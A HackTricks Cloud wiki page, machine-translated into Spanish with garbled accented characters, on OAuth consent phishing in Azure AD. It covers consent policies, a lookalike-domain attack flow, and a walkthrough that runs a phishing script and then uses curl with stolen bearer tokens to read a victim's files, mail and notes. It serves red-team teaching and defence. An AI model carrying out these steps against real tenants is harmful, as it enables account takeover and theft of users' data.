# Az - OAuth Apps Phishing

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Phishing de Aplicaciones OAuth

**Las Aplicaciones de Azure** est谩n configuradas con los permisos que podr谩n usar cuando un usuario consienta la aplicaci贸n (como enumerar el directorio, acceder a archivos o realizar otras acciones). Tenga en cuenta que la aplicaci贸n actuar谩 en nombre del usuario, por lo que incluso si la aplicaci贸n pudiera estar pidiendo permisos de administraci贸n, si el **usuario que consiente no tiene ese permiso**, la aplicaci贸n **no podr谩 realizar acciones administrativas**.

### Permisos de consentimiento de la aplicaci贸n

Por defecto, cualquier **usuario puede dar consentimiento a las aplicaciones**, aunque esto se puede configurar para que los usuarios solo puedan consentir **aplicaciones de editores verificados para permisos seleccionados** o incluso **eliminar el permiso** para que los usuarios consientan a las aplicaciones.

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Si los usuarios no pueden consentir, los **administradores** como `GA`, `Application Administrator` o `Cloud Application` `Administrator` pueden **consentir las aplicaciones** que los usuarios podr谩n usar.

Adem谩s, si los usuarios solo pueden consentir aplicaciones que utilizan permisos de **bajo riesgo**, estos permisos son por defecto **openid**, **profile**, **email**, **User.Read** y **offline\_access**, aunque es posible **agregar m谩s** a esta lista.

Y si pueden consentir a todas las aplicaciones, pueden consentir a todas las aplicaciones.

### 2 Tipos de ataques

* **No autenticado**: Desde una cuenta externa, crear una aplicaci贸n con los **permisos de bajo riesgo** `User.Read` y `User.ReadBasic.All`, por ejemplo, phishing a un usuario, y podr谩s acceder a la informaci贸n del directorio.
* Esto requiere que el usuario phished sea **capaz de aceptar aplicaciones OAuth de un inquilino externo**.
* Si el usuario phished es un administrador que puede **consentir cualquier aplicaci贸n con cualquier permiso**, la aplicaci贸n tambi茅n podr铆a **solicitar permisos privilegiados**.
* **Autenticado**: Habiendo comprometido un principal con suficientes privilegios, **crear una aplicaci贸n dentro de la cuenta** y **phishing** a alg煤n **usuario privilegiado** que pueda aceptar permisos OAuth privilegiados.
* En este caso, ya puedes acceder a la informaci贸n del directorio, por lo que el permiso `User.ReadBasic.All` ya no es interesante.
* Probablemente est茅s interesado en **permisos que requieren que un administrador los otorgue**, porque un usuario normal no puede dar a las aplicaciones OAuth ning煤n permiso, por eso necesitas **phishing solo a esos usuarios** (m谩s sobre qu茅 roles/permisos otorgan este privilegio m谩s adelante).

### Los usuarios pueden consentir

Ten en cuenta que necesitas ejecutar este comando desde un usuario dentro del inquilino, no puedes encontrar esta configuraci贸n de un inquilino desde uno externo. El siguiente cli puede ayudarte a entender los permisos de los usuarios:

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy"
```
{% endcode %}

* Los usuarios pueden consentir a todas las aplicaciones: Si dentro de **`permissionGrantPoliciesAssigned`** puedes encontrar: `ManagePermissionGrantsForSelf.microsoft-user-default-legacy` entonces los usuarios pueden aceptar cada aplicaci贸n.
* Los usuarios pueden consentir a aplicaciones de editores verificados o de tu organizaci贸n, pero solo para los permisos que selecciones: Si dentro de **`permissionGrantPoliciesAssigned`** puedes encontrar: `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team` entonces los usuarios pueden aceptar cada aplicaci贸n.
* **Deshabilitar el consentimiento del usuario**: Si dentro de **`permissionGrantPoliciesAssigned`** solo puedes encontrar: `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-chat` y `ManagePermissionGrantsForOwnedResource.microsoft-dynamically-managed-permissions-for-team` entonces los usuarios no pueden consentir ninguno.

Es posible encontrar el significado de cada una de las pol铆ticas comentadas en:

{% code overflow="wrap" %}
```bash
az rest --method GET --url "https://graph.microsoft.com/v1.0/policies/permissionGrantPolicies"
```
{% endcode %}

### **Administradores de Aplicaciones**

Verifique los usuarios que son considerados administradores de aplicaciones (pueden aceptar nuevas aplicaciones):

{% code overflow="wrap" %}
```bash
# Get list of roles
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles"

# Get Global Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1b2256f9-46c1-4fc2-a125-5b2f51bb43b7/members"

# Get Application Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/1e92c3b7-2363-4826-93a6-7f7a5b53e7f9/members"

# Get Cloud Applications Administrators
az rest --method GET --url "https://graph.microsoft.com/v1.0/directoryRoles/0d601d27-7b9c-476f-8134-8e7cd6744f02/members"
```
{% endcode %}

## **Descripci贸n general del flujo de ataque**

El ataque implica varios pasos dirigidos a una empresa gen茅rica. As铆 es como podr铆a desarrollarse:

1. **Registro de dominio y alojamiento de la aplicaci贸n**: El atacante registra un dominio que se asemeja a un sitio de confianza, por ejemplo, "safedomainlogin.com". Bajo este dominio, se crea un subdominio (por ejemplo, "companyname.safedomainlogin.com") para alojar una aplicaci贸n dise帽ada para capturar c贸digos de autorizaci贸n y solicitar tokens de acceso.
2. **Registro de la aplicaci贸n en Azure AD**: El atacante luego registra una Aplicaci贸n Multi-Tenant en su inquilino de Azure AD, nombr谩ndola como la empresa objetivo para parecer leg铆tima. Configuran la URL de redirecci贸n de la aplicaci贸n para que apunte al subdominio que aloja la aplicaci贸n maliciosa.
3. **Configuraci贸n de permisos**: El atacante configura la aplicaci贸n con varios permisos de API (por ejemplo, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`). Estos permisos, una vez otorgados por el usuario, permiten al atacante extraer informaci贸n sensible en nombre del usuario.
4. **Distribuci贸n de enlaces maliciosos**: El atacante elabora un enlace que contiene el id del cliente de la aplicaci贸n maliciosa y lo comparte con usuarios espec铆ficos, enga帽谩ndolos para que otorguen su consentimiento.

## Ejemplo de ataque

1. Registra una **nueva aplicaci贸n**. Puede ser solo para el directorio actual si est谩s usando un usuario del directorio atacado o para cualquier directorio si este es un ataque externo (como en la imagen siguiente).
1. Tambi茅n establece la **URI de redirecci贸n** a la URL esperada donde deseas recibir el c贸digo para obtener tokens (`http://localhost:8000/callback` por defecto).

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

2. Luego crea un secreto de aplicaci贸n:

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

3. Selecciona permisos de API (por ejemplo, `Mail.Read`, `Notes.Read.All`, `Files.ReadWrite.All`, `User.ReadBasic.All`, `User.Read`)

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

4. **Ejecuta la p谩gina web (**[**azure\_oauth\_phishing\_example**](https://github.com/carlospolop/azure_oauth_phishing_example)**)** que solicita los permisos:

{% code overflow="wrap" %}
```bash
# From https://github.com/carlospolop/azure_oauth_phishing_example
python3 azure_oauth_phishing_example.py --client-secret <client-secret> --client-id <client-id> --scopes "email,Files.ReadWrite.All,Mail.Read,Notes.Read.All,offline_access,openid,profile,User.Read"
```
{% endcode %}

5. **Env铆a la URL a la v铆ctima**
1. En este caso `http://localhost:8000`
6. **Las v铆ctimas** necesitan **aceptar el aviso:**

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

7. Usa el **token de acceso para acceder a los permisos solicitados**:
```bash
export ACCESS_TOKEN=<ACCESS_TOKEN>

# List drive files
curl -X GET \
https://graph.microsoft.com/v1.0/me/drive/root/children \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List eails
curl -X GET \
https://graph.microsoft.com/v1.0/me/messages \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"

# List notes
curl -X GET \
https://graph.microsoft.com/v1.0/me/onenote/notebooks \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Accept: application/json"
```
## Otras Herramientas

* [**365-Stealer**](https://github.com/AlteredSecurity/365-Stealer)**:** Consulta [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer) para aprender a configurarlo.
* [**O365-Attack-Toolkit**](https://github.com/mdsecactivebreach/o365-attack-toolkit)

## Post-Explotaci贸n

### Phishing Post-Explotaci贸n

Dependiendo de los permisos solicitados, podr铆as **acceder a diferentes datos del inquilino** (lista de usuarios, grupos... o incluso modificar configuraciones) e **informaci贸n del usuario** (archivos, notas, correos electr贸nicos...). Luego, puedes usar estos permisos para realizar esas acciones.

### Post Explotaci贸n de Aplicaciones

Consulta las secciones de Aplicaciones y Principal de Servicio de la p谩gina:

{% content-ref url="../az-privilege-escalation/az-entraid-privesc/" %}
[az-entraid-privesc](../az-privilege-escalation/az-entraid-privesc/)
{% endcontent-ref %}

## Referencias

* [https://www.alteredsecurity.com/post/introduction-to-365-stealer](https://www.alteredsecurity.com/post/introduction-to-365-stealer)
* [https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/](https://swisskyrepo.github.io/InternalAllTheThings/cloud/azure/azure-phishing/)

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2) (1).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Consulta los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
